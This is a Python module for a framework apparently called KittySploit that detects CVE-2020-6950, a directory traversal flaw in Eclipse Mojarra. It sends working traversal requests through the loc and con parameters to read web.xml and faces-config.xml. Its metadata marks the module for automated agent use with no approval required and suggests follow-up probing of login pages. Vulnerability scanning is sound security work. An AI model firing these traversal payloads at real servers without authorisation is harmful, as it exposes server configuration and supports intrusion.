#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory traversal in Eclipse Mojarra before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Eclipse Mojarra - Local File Read Detection',
        'description': 'Directory traversal in Eclipse Mojarra before 2.3.14 allows attackers to read arbitrary files via the loc parameter or con parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'mojarra', 'lfi', 'eclipse', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/eclipse-ee4j/mojarra/commit/cefbb9447e7be560e59da2da6bd7cb93776f7741',
            'https://github.com/eclipse-ee4j/mojarra/issues/4571',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-6950',
            'https://bugs.eclipse.org/bugs/show_bug.cgi?id=550943',
            'https://www.oracle.com/security-alerts/cpuapr2022.html',
        ],
        'cve': 'CVE-2020-6950',
    }

    def run(self):
        for path in ('/javax.faces.resources/web.xml.jsf?loc=/../../WEB-INF', '/javax.faces.resources/web.xml.jsf?con=/../../WEB-INF', '/javax.faces.resources/faces-config.xml.jsf?loc=/../../WEB-INF', '/javax.faces.resources/faces-config.xml.jsf?con=/../../WEB-INF'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<web-app', '<servlet>', '<faces-config', '</faces-config>',)
            header_any = ('application/xml',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Eclipse Mojarra - Local File Read detected",
                    path=path,
                )
                return True
        return False

